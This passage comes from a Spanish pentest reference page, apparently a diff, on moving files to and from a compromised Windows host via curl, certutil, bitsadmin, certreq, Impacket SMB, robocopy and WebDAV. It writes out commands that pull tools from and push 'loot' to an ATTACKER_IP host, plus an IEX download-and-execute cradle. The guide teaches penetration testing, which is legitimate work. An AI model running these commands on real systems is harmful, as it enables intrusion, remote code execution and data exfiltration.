pentest, mover un archivo suele depender más de la shell disponible y de los protocolos alcanzables que de la herramienta que preferiríamos utilizar. PowerShell puede estar restringido mientras <code>certutil.exe</code> sigue funcionando, HTTP puede estar filtrado mientras TCP/445 es accesible, y una sesión WinRM o RDP existente puede proporcionar ya su propio canal de transferencia.</p>
+<p>Lo útil es disponer de varias rutas y cambiar de método cuando la restricción actual invalida una de ellas.</p>
+<p>En esta Note, <strong>download</strong> significa attacker → Windows y <strong>upload</strong> significa Windows → attacker, salvo cuando una herramienta utilice explícitamente otra terminología.</p>
+<h2 id="referencia-rápida">Referencia rápida</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Situación</th><th>Métodos a probar</th></tr></thead><tbody><tr><td>PowerShell + HTTP(S)</td><td><code>curl.exe</code>, <code>Invoke-WebRequest</code>, <code>WebClient</code>, BITS</td></tr><tr><td>Solo <code>cmd.exe</code> + HTTP(S)</td><td><code>curl.exe</code>, <code>certutil.exe</code>, <code>bitsadmin.exe</code>, <code>certreq.exe</code></td></tr><tr><td>TCP/445 accesible hacia el attacker</td><td>Impacket SMB + <code>copy</code>, <code>Copy-Item</code>, <code>robocopy</code></td></tr><tr><td>HTTP accesible y se necesita transferencia bidireccional</td><td>HTTP upload server o WebDAV</td></tr><tr><td>Sesión Evil-WinRM</td><td><code>upload</code> / <code>download</code></td></tr><tr><td>PowerShell Remoting</td><td><code>Copy-Item -ToSession</code> / <code>-FromSession</code></td></tr><tr><td>Sesión RDP</td><td>Drive redirection + <code>\\tsclient\share</code></td></tr><tr><td>SSH disponible</td><td><code>scp.exe</code>, <code>sftp.exe</code></td></tr><tr><td>FTP accesible</td><td><code>ftp.exe</code></td></tr><tr><td>Solo existe un canal de texto</td><td>Base64</td></tr><tr><td>Fallan las rutas habituales</td><td><code>certreq</code>, <code>esentutl</code>, <code>expand</code>, otros binarios nativos</td></tr></tbody></table>
+<p>Antes de montar un canal nuevo, conviene comprobar qué existe realmente en el host.</p>
+<div class="pub-tabs"><section class="pub-tab" data-tab-label="cmd.exe"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">whoami</span></span>
+<span class="line"><span style="color:#FF7B72">echo</span><span style="color:#E6EDF3"> %TEMP%</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#FF7B72">where</span><span style="color:#FF7B72"> powershell</span></span>
+<span class="line"><span style="color:#FF7B72">where</span><span style="color:#E6EDF3"> curl</span></span>
+<span class="line"><span style="color:#FF7B72">where</span><span style="color:#FF7B72"> certutil</span></span>
+<span class="line"><span style="color:#FF7B72">where</span><span style="color:#FF7B72"> bitsadmin</span></span>
+<span class="line"><span style="color:#FF7B72">where</span><span style="color:#FF7B72"> ftp</span></span>
+<span class="line"><span style="color:#FF7B72">where</span><span style="color:#FF7B72"> ssh</span></span>
+<span class="line"><span style="color:#FF7B72">where</span><span style="color:#FF7B72"> scp</span></span>
+<span class="line"><span style="color:#FF7B72">where</span><span style="color:#E6EDF3"> tar</span></span></code></pre></section><section class="pub-tab" data-tab-label="PowerShell"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">whoami</span></span>
+<span class="line"><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span></span>
+<span class="line"><span style="color:#79C0FF">$PSVersionTable</span><span style="color:#E6EDF3">.PSVersion</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#79C0FF">Get-Command</span><span style="color:#79C0FF"> curl.exe</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">ErrorAction SilentlyContinue</span></span>
+<span class="line"><span style="color:#79C0FF">Get-Command</span><span style="color:#79C0FF"> certutil.exe</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">ErrorAction SilentlyContinue</span></span>
+<span class="line"><span style="color:#79C0FF">Get-Command</span><span style="color:#79C0FF"> bitsadmin.exe</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">ErrorAction SilentlyContinue</span></span>
+<span class="line"><span style="color:#79C0FF">Get-Command</span><span style="color:#79C0FF"> scp.exe</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">ErrorAction SilentlyContinue</span></span>
+<span class="line"><span style="color:#79C0FF">Get-Command</span><span style="color:#79C0FF"> tar.exe</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">ErrorAction SilentlyContinue</span></span></code></pre></section></div>
+<p><code>%TEMP%</code> suele ser un destino cómodo y escribible con un usuario normal. No hay que asumir que la identidad actual pueda escribir en <code>C:\Windows\Temp</code> o en cualquier otro directorio del sistema.</p>
+<h2 id="http">HTTP</h2>
+<p>HTTP suele ser uno de los primeros canales que merece la pena probar porque es sencillo exponer un servidor temporal desde el attacker y Windows dispone de varios clientes.</p>
+<h3 id="preparar-el-attacker">Preparar el attacker</h3>
+<p>Desde Kali u otro host del operador:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#79C0FF">cd</span><span style="color:#A5D6FF"> /opt/tools</span></span>
+<span class="line"><span style="color:#FFA657">python3</span><span style="color:#79C0FF"> -m</span><span style="color:#A5D6FF"> http.server</span><span style="color:#79C0FF"> 8000</span></span></code></pre>
+<p>Los ficheros quedan disponibles bajo:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>http://&#x3C;ATTACKER_IP>:8000/</span></span></code></pre>
+<p>Que falle un cliente concreto no demuestra que HTTP esté bloqueado. PowerShell puede estar restringido mientras <code>curl.exe</code> o <code>certutil.exe</code> continúan funcionando.</p>
+<h3 id="download">Download</h3>
+<p>Los siguientes comandos recuperan el mismo fichero utilizando clientes distintos del propio Windows.</p>
+<div class="pub-tabs"><section class="pub-tab" data-tab-label="curl.exe"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">curl.exe http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">:8000/tool.exe -o %TEMP%\tool.exe</span></span></code></pre></section><section class="pub-tab" data-tab-label="Invoke-WebRequest"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Invoke-WebRequest</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">UseBasicParsing </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Uri </span><span style="color:#A5D6FF">'http://&#x3C;ATTACKER_IP>:8000/tool.exe'</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">OutFile </span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\tool.exe"</span></span></code></pre></section><section class="pub-tab" data-tab-label="WebClient"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">New-Object</span><span style="color:#E6EDF3"> Net.WebClient).DownloadFile(</span></span>
+<span class="line"><span style="color:#A5D6FF">    'http://&#x3C;ATTACKER_IP>:8000/tool.exe'</span><span style="color:#FF7B72">,</span></span>
+<span class="line"><span style="color:#A5D6FF">    "</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\tool.exe"</span></span>
+<span class="line"><span style="color:#E6EDF3">)</span></span></code></pre></section><section class="pub-tab" data-tab-label="certutil"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">certutil.exe -urlcache -split -f http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">:8000/tool.exe %TEMP%\tool.exe</span></span></code></pre></section><section class="pub-tab" data-tab-label="bitsadmin"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">bitsadmin</span><span style="color:#E6EDF3"> /transfer downloadJob /download /priority normal </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">:8000/tool.exe </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  %TEMP%\tool.exe</span></span></code></pre></section></div>
+<p><code>certutil.exe</code> y <code>bitsadmin.exe</code> siguen siendo alternativas útiles desde shells limitadas cuando están presentes. Que Microsoft considere antigua o deprecada su interfaz administrativa no impide que la técnica de transferencia funcione; LOLBAS sigue documentando ambas en versiones actuales de Windows.</p>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">Invoke-WebRequest en Windows PowerShell 5.1</strong><p>Usa <code>-UseBasicParsing</code> con Windows PowerShell 5.1. En sistemas actualizados, omitirlo puede provocar una confirmación interactiva antes del parsing HTML, rompiendo jobs, reverse shells y otros contextos no interactivos.</p></aside>
+<p>En PowerShell 7+ la misma descarga no necesita ese parámetro:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Invoke-WebRequest</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">Uri </span><span style="color:#A5D6FF">'http://&#x3C;ATTACKER_IP>:8000/tool.exe'</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">OutFile </span><span style="color:#A5D6FF">"</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\tool.exe"</span></span></code></pre>
+<p>Windows PowerShell 5.1 también define <code>curl</code> como alias de <code>Invoke-WebRequest</code>. Utiliza <code>curl.exe</code> cuando quieras ejecutar específicamente el cliente curl nativo.</p>
+<h3 id="descargar-scripts-sin-guardarlos-primero">Descargar scripts sin guardarlos primero</h3>
+<p>Cuando el contenido objetivo es un script PowerShell, también puede recuperarse como texto:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">New-Object</span><span style="color:#E6EDF3"> Net.WebClient).DownloadString(</span></span>
+<span class="line"><span style="color:#A5D6FF">    'http://&#x3C;ATTACKER_IP>:8000/script.ps1'</span></span>
+<span class="line"><span style="color:#E6EDF3">)</span></span></code></pre>
+<p>o:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">Invoke-WebRequest</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#FF7B72">  -</span><span style="color:#E6EDF3">UseBasicParsing </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#A5D6FF">  'http://&#x3C;ATTACKER_IP>:8000/script.ps1'</span></span>
+<span class="line"><span style="color:#E6EDF3">).Content</span></span></code></pre>
+<p>Combinar la descarga con <code>Invoke-Expression</code> convierte el patrón en un cradle de ejecución y deja de ser una transferencia de fichero propiamente dicha:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#E6EDF3">IEX (</span><span style="color:#79C0FF">New-Object</span><span style="color:#E6EDF3"> Net.WebClient).DownloadString(</span></span>
+<span class="line"><span style="color:#A5D6FF">    'http://&#x3C;ATTACKER_IP>:8000/script.ps1'</span></span>
+<span class="line"><span style="color:#E6EDF3">)</span></span></code></pre>
+<p>Se incluye porque suele aparecer junto a estas técnicas; ejecución y evasión defensiva pertenecen a sus propias Notes.</p>
+<h3 id="reanudar-una-descarga-grande">Reanudar una descarga grande</h3>
+<p>Si el servidor HTTP soporta range requests, curl puede continuar una descarga parcial:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">curl.exe -C - </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">:8000/large.zip </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  -o %TEMP%\large.zip</span></span></code></pre>
+<h2 id="http-upload">HTTP upload</h2>
+<p><code>python3 -m http.server</code> solo resuelve attacker → Windows. Para recibir ficheros desde el target hace falta un endpoint que acepte uploads.</p>
+<h3 id="preparar-uploadserver">Preparar uploadserver</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">python3</span><span style="color:#79C0FF"> -m</span><span style="color:#A5D6FF"> pip</span><span style="color:#A5D6FF"> install</span><span style="color:#79C0FF"> --user</span><span style="color:#A5D6FF"> uploadserver</span></span>
+<span class="line"><span style="color:#FFA657">python3</span><span style="color:#79C0FF"> -m</span><span style="color:#A5D6FF"> uploadserver</span><span style="color:#79C0FF"> 8000</span></span></code></pre>
+<p>El endpoint queda en:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>http://&#x3C;ATTACKER_IP>:8000/upload</span></span></code></pre>
+<h3 id="upload-con-curlexe">Upload con curl.exe</h3>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">curl.exe -X POST </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  -F </span><span style="color:#A5D6FF">"files=@C:\Windows\Temp\loot.zip"</span><span style="color:#FF7B72"> ^</span></span>
+<span class="line"><span style="color:#E6EDF3">  http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">:8000/upload</span></span></code></pre>
+<p>Desde PowerShell:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">curl.exe</span><span style="color:#FF7B72"> -</span><span style="color:#E6EDF3">X POST </span><span style="color:#FF7B72">`</span></span>
+<span class="line"><span style="color:#FF7B72">  -F</span><span style="color:#A5D6FF"> "files=@</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\loot.zip"</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#A5D6FF">  "http://&#x3C;ATTACKER_IP>:8000/upload"</span></span></code></pre>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">El upload HTTP depende del receptor</strong><p><code>PUT</code>, multipart <code>POST</code>, WebDAV y BITS upload utilizan HTTP, pero son mecanismos de subida distintos. El comando puede ser correcto y fallar simplemente porque el servidor espera otro método o formato de body.</p></aside>
+<h3 id="certreqexe">certreq.exe</h3>
+<p><code>certreq.exe</code> ofrece otra ruta HTTP nativa cuando los clientes habituales no encajan. Puede enviar un fichero mediante POST a un handler compatible:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">certreq.exe -Post </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  -config http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">:8000/ </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  C:\Windows\Temp\loot.zip</span></span></code></pre>
+<p>También puede guardar la respuesta del servidor:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">certreq.exe -Post </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  -config http://</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">:8000/ </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  C:\Windows\Temp\request.bin </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  C:\Windows\Temp\response.bin</span></span></code></pre>
+<p>El receptor debe entender el POST generado por <code>certreq</code>; no hay que asumir que cualquier servidor de multipart upload será compatible.</p>
+<h2 id="smb">SMB</h2>
+<p>SMB es uno de los canales bidireccionales más cómodos en un pentest interno. Si el Windows comprometido puede alcanzar TCP/445 en la máquina atacante, un share temporal permite utilizar comandos de copia nativos.</p>
+<h3 id="preparar-impacket-smb">Preparar Impacket SMB</h3>
+<p>Share anónimo:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> impacket-smbserver</span><span style="color:#A5D6FF"> share</span><span style="color:#A5D6FF"> .</span><span style="color:#79C0FF"> -smb2support</span></span></code></pre>
+<p>Windows lo puede direccionar como:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>\\&#x3C;ATTACKER_IP>\share</span></span></code></pre>
+<p>Si guest access es rechazado, expón el share con credenciales:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">sudo</span><span style="color:#A5D6FF"> impacket-smbserver</span><span style="color:#A5D6FF"> share</span><span style="color:#A5D6FF"> .</span><span style="color:#79C0FF"> -smb2support</span><span style="color:#FF7B72"> \</span></span>
+<span class="line"><span style="color:#79C0FF">  -username</span><span style="color:#A5D6FF"> transfer</span><span style="color:#79C0FF"> -password</span><span style="color:#A5D6FF"> 'TransferPass1!'</span></span></code></pre>
+<p>Y autentica desde Windows:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">net use</span><span style="color:#E6EDF3"> \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">\share /user:transfer *</span></span></code></pre>
+<p>El <code>*</code> solicita la contraseña de forma interactiva en lugar de dejarla en el historial de comandos de Windows.</p>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">Guest SMB puede estar bloqueado</strong><p>Un share anónimo de Impacket puede funcionar en un target y fallar en otro por políticas de guest logon o SMB signing. Prueba un share autenticado antes de concluir que TCP/445 no sirve.</p></aside>
+<h3 id="download-1">Download</h3>
+<div class="pub-tabs"><section class="pub-tab" data-tab-label="cmd.exe"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">copy</span><span style="color:#E6EDF3"> \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">\share\tool.exe %TEMP%\tool.exe</span></span></code></pre></section><section class="pub-tab" data-tab-label="PowerShell"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Copy-Item</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#A5D6FF">  "\\&#x3C;ATTACKER_IP>\share\tool.exe"</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#A5D6FF">  "</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\tool.exe"</span></span></code></pre></section></div>
+<h3 id="upload">Upload</h3>
+<div class="pub-tabs"><section class="pub-tab" data-tab-label="cmd.exe"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">copy</span><span style="color:#E6EDF3"> %TEMP%\loot.zip \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">\share\loot.zip</span></span></code></pre></section><section class="pub-tab" data-tab-label="PowerShell"><pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="color:#79C0FF">Copy-Item</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#A5D6FF">  "</span><span style="color:#E6EDF3">$</span><span style="color:#79C0FF">env:</span><span style="color:#E6EDF3">TEMP</span><span style="color:#A5D6FF">\loot.zip"</span><span style="color:#FF7B72"> `</span></span>
+<span class="line"><span style="color:#A5D6FF">  "\\&#x3C;ATTACKER_IP>\share\loot.zip"</span></span></code></pre></section></div>
+<p>Elimina un mapping creado solo para la transferencia cuando deje de ser necesario:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">net use</span><span style="color:#E6EDF3"> \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">\share /delete</span></span></code></pre>
+<h3 id="sesiones-smb-existentes-y-error-1219">Sesiones SMB existentes y error 1219</h3>
+<p>Windows mantiene conexiones SMB por servidor y contexto de logon. Intentar conectar al mismo servidor con una segunda identidad puede producir:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>System error 1219 has occurred.</span></span>
+<span class="line"><span>Multiple connections to a server or shared resource by the same user,</span></span>
+<span class="line"><span>using more than one user name, are not allowed.</span></span></code></pre>
+<p>Comprueba primero las conexiones existentes:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">net use</span></span></code></pre>
+<p>Elimina solo la conexión que ya no necesites y vuelve a autenticar.</p>
+<h3 id="ficheros-grandes">Ficheros grandes</h3>
+<p>Para ficheros grandes o conexiones poco estables, <code>robocopy</code> puede ser más útil que un <code>copy</code> simple:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">robocopy</span><span style="color:#E6EDF3"> \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">\share %TEMP% large.zip /Z /J /R:2 /W:2</span></span></code></pre>
+<p>Upload:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">robocopy</span><span style="color:#E6EDF3"> %TEMP% \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">\share loot.zip /Z /J /R:2 /W:2</span></span></code></pre>
+<p><code>/Z</code> habilita modo reiniciable y <code>/J</code> utiliza I/O sin buffer, útil con ficheros grandes.</p>
+<aside class="pub-callout warning" role="note"><strong class="pub-callout-title">No añadas /MIR por costumbre</strong><p><code>robocopy /MIR</code> refleja un árbol y puede borrar del destino contenido que no exista en el origen. No es una versión más completa de <code>/Z</code> ni aporta nada para transferir un único fichero.</p></aside>
+<h3 id="binarios-nativos-alternativos-para-smb">Binarios nativos alternativos para SMB</h3>
+<p>Si <code>copy</code> o PowerShell están restringidos, otros binarios de Windows pueden seguir leyendo una ruta UNC.</p>
+<p><code>esentutl.exe</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">esentutl.exe /y </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">\share\tool.exe </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /d %TEMP%\tool.exe </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  /o</span></span></code></pre>
+<p><code>expand.exe</code>:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#E6EDF3">expand.exe </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">></span><span style="color:#E6EDF3">\share\tool.exe </span><span style="color:#FF7B72">^</span></span>
+<span class="line"><span style="color:#E6EDF3">  %TEMP%\tool.exe</span></span></code></pre>
+<p>Son rutas de fallback; no son mejores que <code>copy</code> cuando el comando normal ya funciona.</p>
+<h2 id="webdav">WebDAV</h2>
+<p>WebDAV resulta útil cuando HTTP es alcanzable pero SMB directo no lo es. Windows puede exponer un recurso WebDAV mediante una ruta similar a UNC cuando el servicio <code>WebClient</code> está disponible.</p>
+<h3 id="preparar-el-attacker-1">Preparar el attacker</h3>
+<p>WsgiDAV permite levantar rápidamente un servidor de lectura y escritura:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">python3</span><span style="color:#79C0FF"> -m</span><span style="color:#A5D6FF"> pip</span><span style="color:#A5D6FF"> install</span><span style="color:#A5D6FF"> wsgidav</span><span style="color:#A5D6FF"> cheroot</span></span>
+<span class="line"><span style="color:#FFA657">wsgidav</span><span style="color:#79C0FF"> --host=0.0.0.0</span><span style="color:#79C0FF"> --port=80</span><span style="color:#79C0FF"> --root=.</span><span style="color:#79C0FF"> --auth=anonymous</span></span></code></pre>
+<p>Windows direcciona el recurso como:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>\\&#x3C;ATTACKER_IP>@80\DavWWWRoot\</span></span></code></pre>
+<p>Para HTTPS en el puerto por defecto:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>\\&#x3C;ATTACKER_IP>@SSL\DavWWWRoot\</span></span></code></pre>
+<h3 id="download-2">Download</h3>
+<p>Incluso <code>cmd.exe</code> puede copiar datos desde WebDAV mediante redirección:</p>
+<pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="cmd"><code><span class="line"><span style="color:#FF7B72">type</span><span style="color:#E6EDF3"> \\</span><span style="color:#FF7B72">&#x3C;</span><span style="color:#E6EDF3">ATTACKER_IP</span><span style="color:#FF7B72">>@</span><span style="color:#E6EDF3">80\DavWWWRoot\tool.exe </span><span style="color:#FF7B72">></span><span style="color:#E6EDF3"> %TEMP%\tool.exe</span></span></code></pre>
+<h3 id="upload-1">Upload</h3>
+<p>Si el servidor permite escritura:</p>
